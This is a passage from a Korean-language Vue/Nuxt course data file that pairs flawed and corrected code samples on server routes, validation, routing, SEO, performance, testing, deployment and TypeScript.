          why: `사이트 이름이나 테마 색처럼 환경에 따라 바뀌지 않는 공개 설정까지 runtimeConfig 에 넣으면 환경 변수로 관리할 이유가 없는 값이 늘어납니다. app.config 는 타입 추론과 HMR 이 되고 레이어끼리 병합됩니다.`,
          bad: String.raw`
// 환경과 무관한 공개 설정까지 runtimeConfig 에
runtimeConfig: {
  public: { siteName: 'My Site', primary: '#1f5fbf', perPage: 20 }
}
`,
          good: String.raw`
// app.config.ts: 빌드에 포함되는 공개 설정
export default defineAppConfig({
  siteName: 'My Site',
  theme: { primary: '#1f5fbf' },
  perPage: 20
})
const appConfig = useAppConfig()

// runtimeConfig: 배포 환경마다 다르거나 비밀인 값만 (.env → NUXT_ 변수)
`,
        },
      ],
    },
    {
      id: 'vue-8', no: 8, name: `Nuxt 데이터와 서버`,
      lead: `서버 라우트와 데이터 가져오기 API 를 제대로 쓰는 법입니다. 검증, 오류, 캐시, SSR 안전성을 다룹니다.`,
      lessons: [
        {
          id: 'l1', short: `입력 검증`,
          title: `요청 본문은 readValidatedBody 로 검증한다`,
          why: `readBody 의 결과는 any 라 아무 필드나 DB 에 들어갑니다. 스키마로 검증하면 잘못된 요청은 400 으로 끊기고 핸들러 안에서는 타입이 보장됩니다.`,
          bad: String.raw`
export default defineEventHandler(async (event) => {
  const body = await readBody(event)       // any
  await db.user.create({ data: body })     // 아무 필드나 들어온다
})
`,
          good: String.raw`
import { z } from 'zod'
const Body = z.object({
  name: z.string().min(1).max(50),
  email: z.string().email()
})

export default defineEventHandler(async (event) => {
  const body = await readValidatedBody(event, Body.parse)   // 실패하면 400
  await db.user.create({ data: body })                      // 타입: { name, email }
})
`,
          note: `쿼리는 <code>getValidatedQuery</code>, 경로 매개변수는 <code>getValidatedRouterParams</code> 로 같은 방식입니다.`,
        },
        {
          id: 'l2', short: `createError`,
          title: `오류는 200 에 담지 말고 createError 로 던진다`,
          why: `200 OK 에 오류 메시지를 담으면 클라이언트가 상태 코드로 분기할 수 없고 useFetch 의 error 도 비어 있습니다. 상태 코드와 메시지를 담은 오류를 던집니다.`,
          bad: String.raw`
export default defineEventHandler(async (event) => {
  const user = await db.user.find(id)
  if (!user) return { error: 'not found' }   // 200 OK 에 오류를 담는다
})
`,
          good: String.raw`
export default defineEventHandler(async (event) => {
  const user = await db.user.find(id)
  if (!user) throw createError({ statusCode: 404, statusMessage: 'User not found' })
  return user
})

// 클라이언트
const { data, error } = await useFetch('/api/users/' + id)
if (error.value) console.log(error.value.statusCode)   // 404
`,
          note: `서버에서 던진 일반 Error 의 메시지는 운영 환경에서 클라이언트에 숨겨집니다. 보여 줄 메시지는 createError 에 적습니다.`,
        },
        {
          id: 'l3', short: `lazy / server`,
          title: `느린 데이터는 lazy, 브라우저 전용은 server: false`,
          why: `모든 useFetch 를 await 하면 가장 느린 요청이 끝나야 첫 화면이 나옵니다. 보조 데이터는 내비게이션을 막지 않게 하고, 브라우저에서만 의미 있는 데이터는 서버에서 가져오지 않습니다.`,
          bad: String.raw`
// 모든 데이터를 서버에서 기다리느라 첫 화면이 늦다
const { data: recommendations } = await useFetch('/api/recommendations')   // 느린 API
const { data: me } = await useFetch('/api/me')                            // 브라우저 저장소 의존
`,
          good: String.raw`
// 느린 보조 데이터: 내비게이션을 막지 않고 나중에 채운다
const { data: recs, status } = useLazyFetch('/api/recommendations')

// 브라우저에서만 의미 있는 데이터
const { data: me } = useFetch('/api/me', { server: false })

// 사용자가 눌러야 가져오는 데이터
const { data, execute } = useFetch('/api/report', { immediate: false })
`,
          note: `<code>status</code> 는 'idle' | 'pending' | 'success' | 'error' 입니다. 옛 <code>pending</code> 불리언보다 상태를 정확히 구분합니다.`,
        },
        {
          id: 'l4', short: `transform / pick`,
          title: `페이로드에는 필요한 필드만 transform, pick`,
          why: `useFetch 결과는 서버가 그린 HTML 에 JSON 으로 함께 실려 내려갑니다. 응답 전체를 실으면 HTML 이 커지고 하이드레이션이 느려집니다.`,
          bad: String.raw`
const { data } = await useFetch('/api/products')
// 응답 전체(수십 필드 × 수백 개)가 HTML 페이로드에 실려 내려간다
const names = computed(() => data.value.map(p => p.name))
`,
          good: String.raw`
const { data: names } = await useFetch('/api/products', {
  transform: (list) => list.map(p => ({ id: p.id, name: p.name }))   // 페이로드에는 이 결과만
})

const { data: product } = await useFetch('/api/products/' + id, {
  pick: ['id', 'name', 'price']   // 단일 객체의 필드만
})
`,
        },
        {
          id: 'l5', short: `반응형 요청`,
          title: `URL 과 query 에 ref 를 넘기면 바뀔 때 다시 가져온다`,
          why: `URL 문자열을 한 번 만들어 넘기면 값이 바뀌어도 그 주소로만 다시 부릅니다. query 에 ref 를, URL 에 함수를 넘기면 Nuxt 가 변화를 감시해 자동으로 재요청합니다.`,
          bad: String.raw`
const page = ref(1)
const { data, refresh } = await useFetch('/api/items?page=' + page.value)
watch(page, () => refresh())     // URL 이 고정되어 refresh 해도 1페이지만 온다
`,
          good: String.raw`
const page = ref(1)
const { data } = await useFetch('/api/items', {
  query: { page }                // ref 를 넘기면 바뀔 때 자동으로 다시 가져온다
})

// URL 자체가 바뀌면 함수로
const { data: user } = await useFetch(() => '/api/users/' + id.value)
`,
        },
        {
          id: 'l6', short: `refresh`,
          title: `새로고침은 refresh, refreshNuxtData, clearNuxtData`,
          why: `location.reload 는 앱 전체를 다시 띄웁니다. 바뀐 데이터만 다시 가져오고, 다른 컴포넌트가 가진 데이터는 키로 골라 새로고침합니다.`,
          bad: String.raw`
async function remove(id) {
  await $fetch('/api/items/' + id, { method: 'DELETE' })
  location.reload()               // 전체 새로고침
}
`,
          good: String.raw`
const { data: items, refresh } = await useFetch('/api/items', { key: 'items' })

async function remove(id) {
  await $fetch('/api/items/' + id, { method: 'DELETE' })
  await refresh()                 // 이 요청만 다시
  await refreshNuxtData('items')  // 다른 컴포넌트가 가진 데이터면 키로
}

clearNuxtData()                   // 로그아웃: 캐시 비우기
`,
        },
        {
          id: 'l7', short: `서버 미들웨어`,
          title: `모든 요청의 공통 처리는 server/middleware`,
          why: `인증 헤더 해석 같은 공통 처리를 핸들러마다 복사하면 빠뜨리는 곳이 생깁니다. 서버 미들웨어가 요청마다 먼저 돌아 event.context 에 결과를 두고, 판단은 각 핸들러가 합니다.`,
          bad: String.raw`
// 모든 API 핸들러에 같은 인증 코드를 복사한다
export default defineEventHandler(async (event) => {
  const token = getHeader(event, 'authorization')
  if (!token) throw createError({ statusCode: 401 })
  const user = await verify(token)
  ...
})
`,
          good: String.raw`
// server/middleware/auth.ts: 모든 서버 요청 전에 한 번
export default defineEventHandler(async (event) => {
  const token = getCookie(event, 'session')
  event.context.user = token ? await verify(token) : null   // 판단은 핸들러에
})

// server/api/orders.get.ts
export default defineEventHandler((event) => {
  if (!event.context.user) throw createError({ statusCode: 401 })
  return db.orders.byUser(event.context.user.id)
})
`,
          note: `서버 미들웨어는 경로를 가리지 않고 전부 실행되므로 무거운 일은 하지 않습니다. 라우트별 보호는 <code>server/utils/requireUser.ts</code> 같은 헬퍼로 핸들러 안에서 합니다.`,
        },
        {
          id: 'l8', short: `useState`,
          title: `SSR 에서 공유 상태는 모듈 ref 대신 useState`,
          why: `모듈 최상위 ref 는 서버에서 모든 요청이 공유해 사용자 데이터가 섞입니다. useState 는 요청마다 따로 만들고, 서버 값을 클라이언트로 그대로 넘겨 하이드레이션 불일치도 없습니다.`,
          bad: String.raw`
// composables/useCounter.ts
const count = ref(0)             // 모듈 전역: 서버에서 모든 요청이 공유한다
export const useCounter = () => count
`,
          good: String.raw`
export const useCounter = () => useState('counter', () => 0)
// 요청마다 따로, 서버 값이 클라이언트로 그대로 넘어온다

// 컴포넌트
const count = useCounter()
count.value++
`,
          note: `useState 값은 JSON 으로 직렬화되어 넘어갑니다. 클래스 인스턴스나 함수는 넣지 않습니다. 클라이언트 전용이고 직렬화가 필요 없는 큰 상태는 Pinia 나 shallowRef 로.`,
        },
        {
          id: 'l9', short: `서버 캐시`,
          title: `외부 호출 결과는 defineCachedEventHandler 로 캐시`,
          why: `환율, 날씨처럼 자주 바뀌지 않는 외부 데이터를 요청마다 부르면 느리고 비용도 듭니다. Nitro 의 캐시 핸들러는 maxAge 와 swr 로 신선도와 속도를 함께 잡습니다.`,
          bad: String.raw`
// 외부 API 를 요청마다 부른다: 느리고 비용도 든다
export default defineEventHandler(() => $fetch('https://api.rates.com/latest'))
`,
          good: String.raw`
// server/api/rates.get.ts
export default defineCachedEventHandler(
  () => $fetch('https://api.rates.com/latest'),
  { maxAge: 60 * 10, swr: true }   // 10분 캐시. 만료 뒤 첫 요청은 옛 값을 주고 뒤에서 갱신
)

// 임의 값 저장: server/ 안에서
const storage = useStorage('cache')
await storage.setItem('rates', data)
`,
          note: `캐시 저장소는 기본이 메모리입니다. 서버 인스턴스가 여럿이면 nuxt.config 의 <code>nitro.storage</code> 로 Redis 등을 지정합니다.`,
        },
        {
          id: 'l10', short: `서버 전용 코드`,
          title: `DB 와 비밀은 server/ 안에서만, 분기는 import.meta`,
          why: `컴포넌트에서 서버 모듈을 import 하면 클라이언트 번들에 끌려 들어가거나 빌드가 실패합니다. 데이터는 API 로 받고, 환경 분기가 꼭 필요하면 import.meta.client / server 를 씁니다.`,
          bad: String.raw`
<script setup>
import { db } from '~/server/db'          // 서버 모듈을 컴포넌트에서: 번들에 들어가거나 빌드 실패
const users = await db.user.findMany()
</script>
`,
          good: String.raw`
// DB 접근은 server/ 안에서만, 컴포넌트는 API 로
const { data: users } = await useFetch('/api/users')

// 분기가 꼭 필요하면 (예: 브라우저 API)
if (import.meta.client) localStorage.setItem('seen', '1')
onMounted(() => { ... })                   // 가장 쉬운 클라이언트 전용 자리
`,
          note: `<code>process.client</code> / <code>process.server</code> 는 더 이상 권장되지 않습니다. <code>import.meta.client</code> / <code>import.meta.server</code> 를 씁니다.`,
        },
      ],
    },
    {
      id: 'vue-9', no: 9, name: `라우팅, 미들웨어, SEO`,
      lead: `페이지 이동, 접근 제어, 오류 화면, 메타 태그를 Nuxt 방식으로 다룹니다.`,
      lessons: [
        {
          id: 'l1', short: `라우트 미들웨어`,
          title: `접근 제어는 페이지 안이 아니라 미들웨어에서`,
          why: `페이지 setup 에서 로그인 검사를 하면 페이지마다 복사되고, 렌더링이 시작된 뒤라 화면이 깜빡입니다. 라우트 미들웨어는 이동 전에 돌고 definePageMeta 한 줄로 붙입니다.`,
          bad: String.raw`
<script setup>
const auth = useAuthStore()
if (!auth.user) navigateTo('/login')      // 페이지마다 복사. 렌더링이 시작된 뒤라 깜빡인다
</script>
`,
          good: String.raw`
// middleware/auth.ts
export default defineNuxtRouteMiddleware((to) => {
  const auth = useAuthStore()
  if (!auth.user) return navigateTo({ path: '/login', query: { redirect: to.fullPath } })
})

// pages/admin/index.vue
definePageMeta({ middleware: ['auth'] })

// 전부 적용: middleware/log.global.ts
`,
        },
        {
          id: 'l2', short: `navigateTo`,
          title: `이동은 navigateTo, 미들웨어에서는 반드시 return`,
          why: `router.push 는 서버에서 동작하지 않고, 미들웨어에서 반환하지 않으면 원래 페이지 렌더링이 계속됩니다. navigateTo 는 서버와 클라이언트에서 모두 동작하고 외부 주소도 처리합니다.`,
          bad: String.raw`
// 미들웨어 안에서
router.push('/login')                 // 반환하지 않아 원래 페이지 렌더링이 계속된다

// 서버에서 외부 주소로
window.location.href = 'https://...'  // 서버에는 window 가 없다
`,
          good: String.raw`
// 미들웨어: 반드시 return
return navigateTo('/login')
return abortNavigation()                              // 머무르기
return navigateTo('https://example.com', { external: true })

// 컴포넌트에서도 navigateTo 가 서버/클라이언트 모두 동작한다
await navigateTo({ path: '/orders', query: { page: 2 } }, { replace: true })
`,
        },
        {
          id: 'l3', short: `동적 라우트`,
          title: `동적 매개변수는 validate 로 거르고 이름으로 타입을 좁힌다`,
          why: `[id].vue 의 params.id 는 문자열이고 아무 값이나 들어옵니다. validate 로 모양이 틀린 요청은 404 로 보내고, useRoute 에 라우트 이름을 주면 params 타입이 좁혀집니다.`,
          bad: String.raw`
<!-- pages/users/[id].vue -->
<script setup>
const route = useRoute()
const { data } = await useFetch('/api/users/' + route.params.id)   // 'abc' 도 그대로 보낸다
</script>
`,
          good: String.raw`
<script setup>
definePageMeta({
  validate: (route) => /^\d+$/.test(String(route.params.id))   // 아니면 404
})
const route = useRoute('users-id')         // 라우트 이름을 주면 params 타입이 좁혀진다
const id = computed(() => Number(route.params.id))
const { data } = await useFetch(() => '/api/users/' + id.value)
</script>
`,
        },
        {
          id: 'l4', short: `중첩 라우트`,
          title: `중첩 라우트는 부모 페이지에 NuxtPage 자리를 둔다`,
          why: `users.vue 와 users/ 디렉터리를 함께 두면 자식 페이지가 부모 안에 렌더링됩니다. 부모에 NuxtPage 가 없으면 자식은 어디에도 그려지지 않습니다.`,
          bad: String.raw`
pages/
  users.vue
  users/[id].vue       <!-- users.vue 에 <NuxtPage /> 가 없어 자식이 안 보인다 -->
`,
          good: String.raw`
pages/
  users.vue            부모: 목록 + <NuxtPage /> 로 자식이 들어갈 자리
  users/index.vue      /users
  users/[id].vue       /users/:id (부모 안에 렌더링)

<!-- pages/users.vue -->
<template>
  <UserList />
  <NuxtPage />
</template>
`,
        },
        {
          id: 'l5', short: `useSeoMeta`,
          title: `제목과 메타 태그는 useHead, useSeoMeta`,
          why: `onMounted 에서 document.title 을 바꾸면 서버 HTML 에는 없어 검색 엔진과 링크 미리보기에 보이지 않습니다. useSeoMeta 는 서버 렌더링에 포함되고 getter 를 주면 반응형입니다.`,
          bad: String.raw`
onMounted(() => {
  document.title = product.name          // 서버 HTML 에는 없다: 검색 엔진과 공유 미리보기에 안 보인다
})
`,
          good: String.raw`
useSeoMeta({
  title: () => product.value?.name,       // 반응형: getter 로
  description: () => product.value?.summary,
  ogImage: () => product.value?.image
})

useHead({
  link: [{ rel: 'canonical', href: 'https://example.com/p/' + id }]
})
`,
          note: `사이트 공통 제목 양식은 nuxt.config 의 <code>app.head.titleTemplate</code> 이나 app.vue 의 useHead 에 둡니다.`,
        },
        {
          id: 'l6', short: `error.vue`,
          title: `없는 데이터는 404 를 던지고 error.vue 가 받는다`,
          why: `데이터가 없을 때 빈 화면을 보여 주면 사용자도 검색 엔진도 무슨 일인지 모릅니다. fatal 오류를 던지면 앱 루트의 error.vue 가 상태 코드와 함께 뜨고, clearError 로 돌아갑니다.`,
          bad: String.raw`
const { data } = await useFetch('/api/posts/' + slug)
// <div v-if="data">...</div>   데이터가 없으면 그냥 빈 화면, 상태 코드는 200
`,
          good: String.raw`
const { data } = await useFetch('/api/posts/' + slug)
if (!data.value) throw createError({ statusCode: 404, statusMessage: '글이 없습니다', fatal: true })

<!-- error.vue (앱 루트, app.vue 옆) -->
<script setup lang="ts">
import type { NuxtError } from '#app'
defineProps<{ error: NuxtError }>()
const home = () => clearError({ redirect: '/' })
</script>
<template>
  <h1>{{ error.statusCode }}</h1>
  <button @click="home">홈으로</button>
</template>
`,
        },
        {
          id: 'l7', short: `ErrorBoundary`,
          title: `위젯 하나의 오류는 NuxtErrorBoundary 로 가둔다`,
          why: `부가 위젯이 실패했다고 페이지 전체가 error.vue 로 넘어가면 본문까지 잃습니다. 경계로 감싸면 그 부분만 대체 화면이 됩니다.`,
          bad: String.raw`
<!-- 위젯 하나가 실패하면 페이지 전체가 error.vue 로 넘어간다 -->
<RecommendWidget />
<ArticleBody />
`,
          good: String.raw`
<NuxtErrorBoundary @error="log">
  <RecommendWidget />
  <template #error="{ error, clearError }">
    <p>추천을 불러오지 못했습니다 <button @click="clearError">다시</button></p>
  </template>
</NuxtErrorBoundary>
<ArticleBody />
`,
          note: `클라이언트 쪽 오류만 잡습니다. 서버 렌더링 중 오류는 여전히 error.vue 로 갑니다.`,
        },
        {
          id: 'l8', short: `routeRules`,
          title: `리다이렉트, 프리렌더, 캐시는 routeRules 로`,
          why: `리다이렉트를 미들웨어로, 캐시를 핸들러마다 손으로 짜면 설정이 흩어집니다. routeRules 는 경로별 렌더링 방식과 캐시, 헤더를 한 곳에서 선언합니다.`,
          bad: String.raw`
// 리다이렉트는 미들웨어로, 정적 페이지도 매번 SSR, API 캐시는 손으로
export default defineNuxtRouteMiddleware((to) => {
  if (to.path === '/old') return navigateTo('/new', { redirectCode: 301 })
})
`,
          good: String.raw`
// nuxt.config.ts
export default defineNuxtConfig({
  routeRules: {
    '/old': { redirect: { to: '/new', statusCode: 301 } },
    '/about': { prerender: true },              // 빌드 때 HTML 생성
    '/blog/**': { swr: 3600 },                  // 1시간 캐시 뒤 백그라운드 갱신
    '/admin/**': { ssr: false },                // SPA 처럼
    '/api/**': { cors: true, headers: { 'cache-control': 'max-age=60' } }
  }
})
`,
        },
        {
          id: 'l9', short: `쿼리 상태`,
          title: `페이지, 정렬, 필터는 ref 가 아니라 쿼리 스트링에`,
          why: `목록 상태를 컴포넌트 ref 에만 두면 새로고침하면 사라지고 링크를 공유할 수도 없습니다. 주소에 두면 뒤로 가기, 공유, 서버 렌더링이 모두 맞아떨어집니다.`,
          bad: String.raw`
const page = ref(1)                     // 새로고침하면 1페이지로, 링크 공유도 안 된다
const sort = ref('name')
`,
          good: String.raw`
const route = useRoute()
const router = useRouter()

const page = computed({
  get: () => Number(route.query.page ?? 1),
  set: (p) => router.replace({ query: { ...route.query, page: p } })
})
// useFetch 의 query 에 route.query 를 넘기면 주소가 바뀔 때 자동 재요청
const { data } = await useFetch('/api/items', { query: computed(() => route.query) })
`,
          note: `VueUse 의 <code>useRouteQuery</code> (@vueuse/router) 가 이 패턴을 한 줄로 만듭니다.`,
        },
        {
          id: 'l10', short: `페이지 전환`,
          title: `페이지 전환 효과는 pageTransition 설정으로`,
          why: `페이지마다 Transition 으로 감싸면 빠뜨리는 페이지가 생기고 레이아웃 전환은 손으로 못 합니다. nuxt.config 에서 한 번 켜고 CSS 만 씁니다.`,
          bad: String.raw`
<!-- 페이지마다 <Transition> 으로 감싸고 레이아웃 전환도 손으로 -->
<Transition name="page"><div>...</div></Transition>
`,
          good: String.raw`
// nuxt.config.ts
app: {
  pageTransition: { name: 'page', mode: 'out-in' },
  layoutTransition: { name: 'layout', mode: 'out-in' }
}

/* assets/main.css */
.page-enter-active, .page-leave-active { transition: opacity .2s }
.page-enter-from, .page-leave-to { opacity: 0 }

// 한 페이지만 다르게: definePageMeta({ pageTransition: { name: 'slide' } })
`,
          note: `페이지 전환은 페이지의 루트 요소가 하나일 때만 동작합니다.`,
        },
      ],
    },
    {
      id: 'vue-10', no: 10, name: `성능, 테스트, 배포`,
      lead: `번들을 줄이고, 하이드레이션을 안전하게 하고, 테스트와 배포까지 마무리하는 습관입니다.`,
      lessons: [
        {
          id: 'l1', short: `지연 로딩`,
          title: `무거운 컴포넌트는 defineAsyncComponent 또는 Lazy 접두사`,
          why: `에디터나 차트처럼 큰 컴포넌트를 정적으로 import 하면 안 쓰는 화면까지 첫 로드에 포함됩니다. 비동기로 두면 필요할 때 따로 받아옵니다.`,
          bad: String.raw`
import MarkdownEditor from '~/components/MarkdownEditor.vue'   // 300KB 가 첫 로드에 포함
<MarkdownEditor v-if="editing" />
`,
          good: String.raw`
// Vue
const MarkdownEditor = defineAsyncComponent(() => import('~/components/MarkdownEditor.vue'))

<!-- Nuxt: Lazy 접두사만 붙이면 된다 -->
<LazyMarkdownEditor v-if="editing" />
<LazyMarkdownEditor hydrate-on-visible />      <!-- Nuxt 3.16+: 보일 때 하이드레이션 -->
`,
        },
        {
          id: 'l2', short: `v-memo`,
          title: `큰 목록의 불필요한 재렌더링은 v-memo 로 건너뛴다`,
          why: `선택이 바뀔 때마다 수천 행을 전부 다시 그리면 느립니다. v-memo 에 적은 값이 그대로면 그 서브트리를 건너뜁니다. 먼저 재서 쓰는 도구입니다.`,
          bad: String.raw`
<!-- 선택이 바뀔 때마다 1만 행 전부 다시 렌더링 -->
<tr v-for="row in rows" :key="row.id" :class="{ selected: row.id === selectedId }">
  <td>{{ row.name }}</td> ... 20개 열
</tr>
`,
          good: String.raw`
<tr v-for="row in rows" :key="row.id"
    v-memo="[row.id === selectedId]"          <!-- 이 값이 그대로면 행을 건너뛴다 -->
    :class="{ selected: row.id === selectedId }">
  <td>{{ row.name }}</td> ...
</tr>

<footer v-once>{{ buildInfo }}</footer>        <!-- 한 번만 렌더링 -->
`,
          note: `대부분의 목록은 v-memo 없이도 충분히 빠릅니다. 개발자 도구의 성능 탭에서 재고 나서 씁니다.`,
        },
        {
          id: 'l3', short: `가상 목록`,
          title: `수만 개 항목은 가상 목록으로`,
          why: `DOM 노드가 수만 개면 스크롤과 렌더링이 버벅입니다. 보이는 영역의 항목만 그리는 가상 목록은 몇십 개 노드로 끝냅니다.`,
          bad: String.raw`
<li v-for="item in items" :key="item.id">...</li>   <!-- 5만 개 DOM 노드 -->
`,
          good: String.raw`
import { useVirtualList } from '@vueuse/core'
const { list, containerProps, wrapperProps } = useVirtualList(items, { itemHeight: 48 })

<div v-bind="containerProps" style="height: 600px">
  <div v-bind="wrapperProps">
    <div v-for="{ data } in list" :key="data.id" style="height: 48px">{{ data.name }}</div>
  </div>
</div>
<!-- 보이는 20~30개만 DOM 에 있다 -->
`,
        },
        {
          id: 'l4', short: `NuxtImg`,
          title: `이미지는 img 대신 NuxtImg`,
          why: `원본 이미지를 그대로 내보내면 모바일에도 4MB 를 보냅니다. @nuxt/image 는 크기별 변환, 포맷 협상, 지연 로딩을 하고 width/height 로 레이아웃 흔들림을 막습니다.`,
          bad: String.raw`
<img src="/photos/hero.jpg">     <!-- 4MB 원본을 모바일에도 -->
`,
          good: String.raw`
<!-- @nuxt/image -->
<NuxtImg src="/photos/hero.jpg" width="1200" height="600"
         sizes="100vw md:50vw" format="webp" loading="lazy" alt="바다가 보이는 언덕" />
<NuxtPicture src="/photos/hero.jpg" format="avif,webp" />
`,
        },
        {
          id: 'l5', short: `컴포넌트 테스트`,
          title: `테스트는 내부 상태가 아니라 사용자가 보는 결과로`,
          why: `wrapper.vm 으로 내부 변수를 검사하면 리팩터링할 때마다 테스트가 깨집니다. 클릭하고 화면과 emit 을 확인하면 구현이 바뀌어도 테스트는 남습니다.`,
          bad: String.raw`
const wrapper = mount(Counter)
expect(wrapper.vm.count).toBe(0)
wrapper.vm.count = 5                    // 내부 구현을 검사한다
expect(wrapper.vm.count).toBe(5)
`,
          good: String.raw`
import { mount } from '@vue/test-utils'
import { it, expect } from 'vitest'

it('누르면 1 올라간다', async () => {
  const wrapper = mount(Counter, { props: { start: 0 } })
  await wrapper.get('button').trigger('click')
  expect(wrapper.text()).toContain('1')               // 사용자가 보는 결과로 검증
  expect(wrapper.emitted('change')?.[0]).toEqual([1])
})
`,
        },
        {
          id: 'l6', short: `Nuxt 테스트`,
          title: `Nuxt 컴포넌트는 @nuxt/test-utils 의 mountSuspended`,
          why: `useFetch, 자동 import, 라우터가 있는 컴포넌트를 그냥 mount 하면 환경이 없어 실패합니다. Nuxt 환경에서 마운트하고 서버 라우트는 registerEndpoint 로 대체합니다.`,
          bad: String.raw`
// Nuxt 자동 import, useFetch, 라우터가 없는 환경에서 mount 하다 실패한다
const wrapper = mount(UserCard)      // useFetch is not defined
`,
          good: String.raw`
// vitest.config.ts: import { defineVitestConfig } from '@nuxt/test-utils/config'
// 테스트 파일 맨 위: // @vitest-environment nuxt
import { mountSuspended, registerEndpoint } from '@nuxt/test-utils/runtime'

registerEndpoint('/api/users/1', () => ({ id: 1, name: 'kim' }))

it('사용자 이름을 보여 준다', async () => {
  const wrapper = await mountSuspended(UserCard, { props: { id: 1 } })
  expect(wrapper.text()).toContain('kim')
})
`,
        },
        {
          id: 'l7', short: `린트, 타입 검사`,
          title: `ESLint 와 strict 타입 검사를 켠다`,
          why: `린트와 타입 검사가 없으면 오타와 null 접근이 운영에서 터집니다. @nuxt/eslint 는 설정을 만들어 주고, typeCheck 는 빌드와 dev 에서 vue-tsc 를 돌립니다.`,
          bad: String.raw`
// 설정 없이 any 와 ! 로 넘긴다
const user = data.value!            // null 일 수 있다
const name = (user as any).nmae     // 오타
`,
          good: String.raw`
// nuxt.config.ts
export default defineNuxtConfig({
  modules: ['@nuxt/eslint'],
  typescript: { strict: true, typeCheck: true }     // 빌드와 dev 에서 vue-tsc 검사
})

// eslint.config.mjs
import withNuxt from './.nuxt/eslint.config.mjs'
export default withNuxt({ rules: { 'vue/multi-word-component-names': 'error' } })

const name = data.value?.name ?? '손님'
`,
        },
        {
          id: 'l8', short: `하이드레이션`,
          title: `서버와 브라우저가 다른 값은 마운트 뒤에 채운다`,
          why: `현재 시각, 난수, localStorage 처럼 서버와 브라우저에서 다른 값을 렌더링하면 하이드레이션 불일치 경고가 나고 운영에서는 조용히 틀린 화면이 됩니다.`,
          bad: String.raw`
<p>{{ new Date().toLocaleString() }}</p>          <!-- 서버와 브라우저 시각이 다르다 -->
<p>{{ Math.random() }}</p>
<p v-if="localStorage.getItem('seen')">...</p>     <!-- 서버엔 localStorage 가 없다 -->
<table><tr><td>...</td></tr></table>               <!-- 브라우저가 tbody 를 끼워 넣어 구조가 달라진다 -->
`,
          good: String.raw`
<ClientOnly>
  <p>{{ now }}</p>
  <template #fallback><p>…</p></template>
</ClientOnly>

const seen = ref(false)
onMounted(() => { seen.value = !!localStorage.getItem('seen') })   // 마운트 뒤 갱신

<table><tbody><tr><td>...</td></tr></tbody></table>                 <!-- 유효한 HTML -->
`,
          note: `하이드레이션 경고는 개발 모드 콘솔에만 나옵니다. 운영에서는 조용히 틀린 화면을 보여 주니 경고를 0으로 유지합니다.`,
        },
        {
          id: 'l9', short: `번들 크기`,
          title: `라이브러리는 필요한 함수만, 무거운 것은 동적 import`,
          why: `lodash 전체나 차트 라이브러리를 메인 번들에 넣으면 첫 화면이 안 쓰는 코드를 받습니다. ESM 으로 필요한 함수만 가져오고, 무거운 것은 쓰는 자리에서 받습니다.`,
          bad: String.raw`
import _ from 'lodash'                 // 전체 70KB
import * as dateFns from 'date-fns'
import { Chart } from 'chart.js/auto'  // 첫 화면에 안 쓰는데 메인 번들에
`,
          good: String.raw`
import debounce from 'lodash-es/debounce'      // 필요한 함수만, ESM 으로 트리 셰이킹
import { format } from 'date-fns'

// 무거운 라이브러리는 쓰는 곳에서 동적 import
async function draw() {
  const { Chart } = await import('chart.js/auto')
  new Chart(canvas.value, config)
}

// 재기: npx nuxi analyze
`,
        },
        {
          id: 'l10', short: `배포`,
          title: `배포 방식에 맞는 빌드 명령을 고른다`, lang: 'plain',
          why: `서버 라우트와 SWR 캐시가 있는 앱을 generate 로 정적 빌드하면 그 기능이 사라집니다. SSR 서버면 build, 완전 정적이면 generate 이고, 플랫폼 프리셋은 보통 자동 감지됩니다.`,
          bad: String.raw`
# 어디에 올리든 똑같이 generate 를 돌리고 서버 라우트가 안 되는 이유를 모른다
npx nuxi generate
`,
          good: String.raw`
# SSR 서버 (Node): 서버 라우트, 미들웨어, SWR 모두 동작
npx nuxi build            # .output/server/index.mjs
node .output/server/index.mjs

# 완전 정적 (서버 라우트 없음, CDN 호스팅)
npx nuxi generate         # .output/public

# 플랫폼 프리셋은 보통 자동 감지. 명시하려면
NITRO_PRESET=cloudflare-pages npx nuxi build
`,
          note: `경로별 prerender, swr 조합은 routeRules 로 정합니다 (9회차 08번). <code>NUXT_</code> 환경 변수는 빌드가 아니라 실행 시점에 읽힙니다.`,
        },
      ],
    },
    {
      id: 'vue-11', no: 11, name: `TypeScript 깊이`,
      lead: `Vue 와 Nuxt 에서 타입을 제대로 받아 쓰는 습관입니다. any 로 넘기지 않고 추론이 흐르게 합니다.`,
      lessons: [
        {
          id: 'l1', short: `any 금지`,
          title: `모르는 값은 any 가 아니라 unknown`,
          why: `any 는 검사를 끄는 스위치라 그 값을 지나는 모든 코드가 검사에서 빠집니다. unknown 은 좁히기 전에는 아무것도 못 하게 막아 실수를 컴파일 단계에서 잡습니다.`,
          bad: String.raw`
async function load(): Promise<any> {
  return await $fetch('/api/user')
}
const u = await load()
u.profile.nmae            // 오타인데 통과, 실행 중에 터진다
`,
          good: String.raw`
interface User { id: number; name: string; profile?: { bio: string } }

async function load(): Promise<User> {
  return await $fetch<User>('/api/user')
}
const u = await load()
u.profile?.bio            // 오타는 컴파일 오류, optional 은 ?. 로

function parse(raw: unknown): User {
  if (typeof raw === 'object' && raw && 'id' in raw) return raw as User
  throw new Error('bad user')
}
`,
        },
        {
          id: 'l2', short: `템플릿 ref 타입`,
          title: `컴포넌트 ref 는 InstanceType, 요소 ref 는 HTML 요소 타입`,
          why: `ref() 에 타입을 주지 않으면 any 가 됩니다. 자식 컴포넌트는 InstanceType&lt;typeof Comp&gt;, DOM 은 HTMLInputElement 처럼 적어야 메서드 자동 완성이 됩니다.`,
          bad: String.raw`
const input = ref()            // any
const modal = ref()            // any
input.value.focuss()           // 오타가 통과한다
`,
          good: String.raw`
import Modal from '~/components/AppModal.vue'

const input = ref<HTMLInputElement | null>(null)
const modal = ref<InstanceType<typeof Modal> | null>(null)
input.value?.focus()
modal.value?.open()            // defineExpose 한 것만 보인다

// Vue 3.5
const input2 = useTemplateRef<HTMLInputElement>('input')
`,
        },
        {
          id: 'l3', short: `리터럴 유니온`,
          title: `문자열 상태는 string 이 아니라 리터럴 유니온`,
          why: `string 으로 두면 'loding' 같은 오타가 통과하고 switch 에서 빠뜨린 경우도 못 잡습니다. 유니온으로 좁히면 자동 완성과 빠짐 검사가 따라옵니다.`,
          bad: String.raw`
const status = ref('idle')              // string
function go(s: string) { status.value = s }
go('loding')                             // 통과
`,
          good: String.raw`
type Status = 'idle' | 'loading' | 'success' | 'error'
const status = ref<Status>('idle')
status.value = 'loding'                  // 오류

// 목록을 한 곳에만 두고 타입을 뽑는다
export const SIZES = ['sm', 'md', 'lg'] as const
